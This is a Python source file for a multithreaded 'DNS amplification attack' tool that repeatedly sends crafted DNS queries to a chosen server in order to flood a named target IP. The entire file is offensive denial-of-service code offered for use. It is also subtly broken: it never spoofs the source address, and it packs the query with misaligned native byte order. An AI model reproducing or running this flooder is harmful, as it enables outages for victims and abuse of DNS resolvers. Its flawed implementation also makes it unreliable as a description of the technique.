import random
import socket
import struct
import threading
import logging
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

class DnsAmplification:
    def __init__(self, target_ip, dns_server_ip, dns_server_port=53, num_threads=10, packet_size=512):
        self.target_ip = target_ip
        self.dns_server_ip = dns_server_ip
        self.dns_server_port = dns_server_port
        self.num_threads = num_threads
        self.packet_size = packet_size
        self.is_running = threading.Event()
        self.is_running.set()

        # Setup logging
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

    def create_dns_query(self, domain):
        """
        Create a DNS query for the given domain.
        """
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0

        query = struct.pack(">HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)

        for part in domain.split('.'):
            query += struct.pack("B", len(part))
            for char in part:
                query += struct.pack("c", char.encode())
        query += struct.pack("BHH", 0, 1, 1)  # Type A, Class IN

        return query[:self.packet_size]  # Limit packet size

    def send_dns_query(self, domain):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            dns_query = self.create_dns_query(domain)
            sock.sendto(dns_query, (self.dns_server_ip, self.dns_server_port))
            logging.debug(Fore.GREEN + f"Sent DNS query for domain {domain} to {self.dns_server_ip}")
        except socket.error as e:
            logging.error(Fore.RED + f"Socket error sending DNS query: {e}")
        finally:
            sock.close()

    def attack(self):
        logging.info(f"Starting DNS Amplification attack to {self.target_ip} via {self.dns_server_ip}:{self.dns_server_port}")

        def attack_task():
            while self.is_running.is_set():
                domain = self.get_random_domain()
                self.send_dns_query(domain)

        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            futures = [executor.submit(attack_task) for _ in range(self.num_threads)]
            for future in futures:
                future.result()

        logging.info(Fore.GREEN + f"DNS Amplification attack to {self.target_ip} via {self.dns_server_ip}:{self.dns_server_port} finished")

    def get_random_domain(self):
        # Generate random extension from a predefined list
        extensions = ["com", "org", "net", "edu"]
        random_extension = random.choice(extensions)
        
        # Combine target IP with random extension
        return f"{self.target_ip}.{random_extension}"

    def stop_attack(self):
        self.is_running.clear()
        logging.info("Stopping DNS Amplification attack.")
